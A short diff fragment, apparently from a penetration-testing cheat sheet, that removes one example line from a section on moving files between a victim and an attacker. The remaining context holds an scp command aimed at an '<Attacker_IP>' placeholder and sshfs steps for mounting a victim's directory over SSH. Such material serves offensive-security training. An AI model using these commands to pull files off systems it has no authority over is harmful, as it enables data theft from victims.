@@ -220,8 +220,6 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 
 If the victim has SSH, the attacker can mount a directory from the victim to the attacker.
 
-In this example, the victim is located at the IP address "192.168.0.68", the victim username is "bob" and the folder to mount is specified after the colon.
-
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
